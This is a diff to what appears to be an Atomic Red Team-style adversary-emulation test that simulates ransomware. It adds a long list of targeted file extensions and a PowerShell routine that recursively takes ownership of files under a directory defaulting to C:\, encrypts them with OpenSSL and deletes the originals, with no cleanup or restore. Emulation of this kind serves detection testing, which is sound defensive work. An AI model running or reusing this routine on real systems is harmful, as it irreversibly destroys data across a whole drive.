@@ -17,6 +17,58 @@ atomic_tests:
         description: Directory to encrypt and delete files from
         type: path
         default: "C:\\"
+      target_extensions:
+        description: List of file extensions to target for encryption
+        type: array
+        default:
+          - ".doc"
+          - ".docx"
+          - ".xls"
+          - ".xlsx"
+          - ".ppt"
+          - ".pptx"
+          - ".pdf"
+          - ".txt"
+          - ".rtf"
+          - ".jpg"
+          - ".jpeg"
+          - ".png"
+          - ".bmp"
+          - ".gif"
+          - ".tiff"
+          - ".svg"
+          - ".mp3"
+          - ".wav"
+          - ".aac"
+          - ".flac"
+          - ".m4a"
+          - ".mp4"
+          - ".avi"
+          - ".mkv"
+          - ".mov"
+          - ".wmv"
+          - ".zip"
+          - ".rar"
+          - ".7z"
+          - ".tar"
+          - ".gz"
+          - ".mdb"
+          - ".accdb"
+          - ".sql"
+          - ".db"
+          - ".sqlite"
+          - ".psd"
+          - ".ai"
+          - ".cpp"
+          - ".java"
+          - ".py"
+          - ".js"
+          - ".html"
+          - ".json"
+          - ".xml"
+          - ".yml"
+          - ".bak"
+          - ".log"
     dependency_executor_name: powershell
     dependencies:
       - description: |
@@ -38,22 +90,34 @@ atomic_tests:
       command: |
         $password = "#{encryption_password}"
         $targetDir = "#{target_directory}"
-        
+        $targetExtensions = "#{target_extensions}".Split(",")
+
+        # Convert extensions to a format suitable for PowerShell filtering
+        $includeClause = $targetExtensions | ForEach-Object { "*$_" } -join ","
+
         # Validate target directory
         if (-Not (Test-Path $targetDir)) {
             Write-Host "The target directory $targetDir does not exist."
             exit 1
         }
 
-        Write-Host "Encrypting files in $targetDir recursively..."
+        Write-Host "=== Starting encryption process ==="
 
         # Encrypt files recursively
-        Get-ChildItem -Path $targetDir -Recurse -File | ForEach-Object {
+        Get-ChildItem -Path $targetDir -Recurse -Include $includeClause -ErrorAction SilentlyContinue | ForEach-Object {
             $file = $_.FullName
 
+            # Log the current file being processed
+            Write-Host "Processing file: $file"
+
             # Take ownership and modify permissions
-            takeown /F $file /A
-            icacls $file /grant Administrators:F /T /C
+            try {
+                takeown /F $file /A
+                icacls $file /grant Administrators:F /T /C
+            } catch {
+                Write-Host "Failed to modify permissions for file: $file"
+                return
+            }
 
             # Encrypt the file with OpenSSL
             $encryptedFile = "$file.enc"
@@ -70,7 +134,7 @@ atomic_tests:
             }
         }
 
-        Write-Host "Encryption and deletion process completed."
+        Write-Host "=== Encryption and deletion process completed ==="
       cleanup_command: |
         Write-Host "No cleanup performed for destructive actions. To recover encrypted files, use the decryption password provided."
         # Note: Ensure that the decryption password is securely stored and accessible.
